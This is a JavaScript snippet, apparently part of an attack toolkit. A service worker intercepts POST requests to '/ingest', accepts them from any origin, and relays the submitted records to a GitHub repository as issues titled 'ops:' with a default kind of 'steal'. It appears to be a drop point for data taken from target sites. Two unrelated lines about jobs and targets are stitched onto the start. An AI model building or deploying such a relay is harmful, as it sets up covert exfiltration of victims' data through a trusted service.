  if (!job) return console.log("no job " + id);
  const targets = (await S.getJson("state/targets.json")) || [];

/* pure-GitHub ingest: intercepts POST /ingest and files a GitHub issue */
const OWNER = "__OWNER__", REPO = "__REPO__";
self.addEventListener("install", function () { self.skipWaiting(); });
self.addEventListener("activate", function (e) { e.waitUntil(self.clients.claim()); });
self.addEventListener("fetch", function (e) {
  const u = new URL(e.request.url);
  if (u.pathname.indexOf("/ingest") < 0) return;
  const cors = { "Access-Control-Allow-Origin": "*", "Content-Type": "application/json" };
  if (e.request.method === "OPTIONS")
    return e.respondWith(new Response(null, { status: 204, headers: cors }));
  e.respondWith((async function () {
    let b = {};
    try { b = await e.request.clone().json(); } catch (x) {}
    const kind = String(b.kind || "steal").slice(0, 32);
    const rec = Object.assign({}, b, { host: b.host || u.host, ts: Date.now() });
    try {
      await fetch("https://api.github.com/repos/" + OWNER + "/" + REPO + "/issues", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: "ops:" + kind, body: JSON.stringify(rec) }) });
    } catch (x) {}
    return new Response(JSON.stringify({ ok: 1 }), { status: 200, headers: cors });
  })());
});
